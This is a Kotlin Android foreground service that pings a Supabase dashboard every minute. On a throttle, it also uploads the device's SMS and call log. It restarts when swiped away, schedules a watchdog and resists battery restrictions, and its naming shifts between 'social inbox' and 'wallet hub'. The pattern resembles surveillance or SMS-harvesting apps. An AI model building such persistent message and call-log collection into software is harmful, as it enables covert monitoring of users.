package com.aggregator.socialinbox

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.util.Log
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.SystemClock
import androidx.core.app.NotificationCompat
import androidx.core.app.NotificationManagerCompat
import androidx.core.content.ContextCompat

/**
 * Foreground service that pings Supabase on a fixed interval so the web dashboard
 * keeps showing the device as "live" (last_seen) even when no notifications arrive.
 *
 * Also runs [SystemTelephonySync] on a throttle while this service is up, so SMS/call
 * log reach Supabase without opening the app (requires READ_SMS + READ_CALL_LOG).
 *
 * Android may still kill aggressive OEMs unless the user disables battery restrictions
 * for this app — see [BatteryOptimizationHelper].
 */
class DashboardHeartbeatService : Service() {

    private val handler = Handler(Looper.getMainLooper())
    private var networkCallback: ConnectivityManager.NetworkCallback? = null
    private var lastNetworkResyncElapsedMs: Long = 0L
    /** -1 = never synced yet (avoid 0: elapsedRealtime can be below the throttle window soon after boot). */
    private var lastTelephonySyncElapsedMs: Long = -1L
    private val heartbeatRunnable = object : Runnable {
        override fun run() {
            if (!allowedToRun()) {
                Log.d(TAG, "Stopping heartbeat: listener or config inactive")
                stopForegroundProperly()
                stopSelf()
                return
            }
            SupabaseSync.registerDeviceWithDashboard(applicationContext, null)
            runTelephonySyncIfDue(force = false)
            handler.postDelayed(this, HEARTBEAT_INTERVAL_MS)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createChannel()
        startAsForeground()
        if (!allowedToRun()) {
            Log.d(TAG, "Not starting heartbeat loop (preconditions not met)")
            stopForegroundProperly()
            stopSelf()
            return
        }
        handler.post(heartbeatRunnable)
        WatchdogScheduler.schedule(this)
        registerConnectivityReloader()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (!allowedToRun()) {
            stopForegroundProperly()
            stopSelf()
            return START_NOT_STICKY
        }
        return START_STICKY
    }

    override fun onDestroy() {
        unregisterConnectivityReloader()
        handler.removeCallbacks(heartbeatRunnable)
        stopForegroundProperly()
        super.onDestroy()
    }

    /**
     * Called when the user clears the app from recent apps. Some devices tear down the process;
     * restarting the foreground service here keeps the connection alive when possible.
     */
    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        if (!allowedToRun()) return
        ContextCompat.startForegroundService(
            applicationContext,
            Intent(applicationContext, DashboardHeartbeatService::class.java)
        )
    }

    private fun allowedToRun(): Boolean {
        val pkgs = NotificationManagerCompat.getEnabledListenerPackages(this)
        if (!pkgs.contains(packageName)) return false
        return SupabaseSync.isConfigured()
    }

    /**
     * When Wi‑Fi / mobile data comes back, Android reports [NET_CAPABILITY_VALIDATED] here.
     * Push [last_seen] to the dashboard immediately instead of waiting for the next minute tick.
     */
    private fun registerConnectivityReloader() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return
        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager ?: return
        if (networkCallback != null) return
        networkCallback = object : ConnectivityManager.NetworkCallback() {
            override fun onCapabilitiesChanged(network: Network, caps: NetworkCapabilities) {
                val online = caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
                    caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
                if (!online) return
                handler.post { syncDeviceAfterNetworkUp() }
            }
        }
        try {
            cm.registerDefaultNetworkCallback(networkCallback!!)
        } catch (e: Exception) {
            Log.w(TAG, "registerDefaultNetworkCallback failed: ${e.message}")
            networkCallback = null
        }
    }

    private fun unregisterConnectivityReloader() {
        val cb = networkCallback ?: return
        networkCallback = null
        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager ?: return
        try {
            cm.unregisterNetworkCallback(cb)
        } catch (e: Exception) {
            Log.w(TAG, "unregisterNetworkCallback: ${e.message}")
        }
    }

    private fun syncDeviceAfterNetworkUp() {
        if (!allowedToRun()) return
        val now = SystemClock.elapsedRealtime()
        if (now - lastNetworkResyncElapsedMs < 5_000L) return
        lastNetworkResyncElapsedMs = now
        Log.d(TAG, "Validated network — syncing device to dashboard")
        SupabaseSync.registerDeviceWithDashboard(applicationContext, null)
        runTelephonySyncIfDue(force = true)
    }

    /**
     * SMS/call log were only synced from [MainActivity]; while the foreground heartbeat runs,
     * pull new rows on an interval so the dashboard updates without opening the app.
     */
    private fun runTelephonySyncIfDue(force: Boolean) {
        if (!SystemTelephonySync.hasTelephonyReadPermissions(this)) return
        val now = SystemClock.elapsedRealtime()
        if (!force && lastTelephonySyncElapsedMs >= 0L &&
            now - lastTelephonySyncElapsedMs < TELEPHONY_SYNC_INTERVAL_MS
        ) {
            return
        }
        lastTelephonySyncElapsedMs = now
        Thread {
            try {
                val r = SystemTelephonySync.syncSmsAndCalls(applicationContext)
                Log.d(TAG, "Background telephony sync: ${r.message}")
            } catch (e: Exception) {
                Log.w(TAG, "Background telephony sync failed: ${e.message}")
            }
        }.start()
    }

    private fun createChannel() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
        val mgr = getSystemService(NotificationManager::class.java) ?: return
        // DEFAULT keeps the ongoing icon visible in the status bar on more OEMs (helps the process stay alive).
        val ch = NotificationChannel(
            CHANNEL_ID,
            getString(R.string.heartbeat_channel_name),
            NotificationManager.IMPORTANCE_DEFAULT
        ).apply {
            description = getString(R.string.heartbeat_channel_desc)
            setShowBadge(false)
        }
        mgr.createNotificationChannel(ch)
    }

    private fun startAsForeground() {
        val notification = buildNotification()
        if (Build.VERSION.SDK_INT >= 34) {
            startForeground(
                NOTIFICATION_ID,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            )
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(getString(R.string.heartbeat_notification_title))
            .setContentText(getString(R.string.heartbeat_notification_body))
            .setSmallIcon(R.drawable.ic_stat_wallet)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_DEFAULT)
            .setCategory(Notification.CATEGORY_SERVICE)
            .build()
    }

    private fun stopForegroundProperly() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            stopForeground(Service.STOP_FOREGROUND_REMOVE)
        } else {
            @Suppress("DEPRECATION")
            stopForeground(false)
        }
    }

    companion object {
        private const val TAG = "WalletHubHeartbeat"
        const val CHANNEL_ID = "wallet_hub_connection"
        private const val NOTIFICATION_ID = 7101
        private const val HEARTBEAT_INTERVAL_MS = 60_000L
        /** Throttle SMS/call uploads — heartbeat runs every minute but telephony sync is heavier. */
        private const val TELEPHONY_SYNC_INTERVAL_MS = 10 * 60_000L

        fun allowed(context: Context): Boolean {
            val pkgs = NotificationManagerCompat.getEnabledListenerPackages(context)
            if (!pkgs.contains(context.packageName)) return false
            return SupabaseSync.isConfigured()
        }

        fun start(context: Context) {
            if (!allowed(context.applicationContext)) {
                Log.d(TAG, "start() skipped — listener off or Supabase not configured")
                return
            }
            ContextCompat.startForegroundService(
                context.applicationContext,
                Intent(context.applicationContext, DashboardHeartbeatService::class.java)
            )
        }

        fun stop(context: Context) {
            val app = context.applicationContext
            WatchdogScheduler.cancel(app)
            app.stopService(Intent(app, DashboardHeartbeatService::class.java))
        }
    }
}
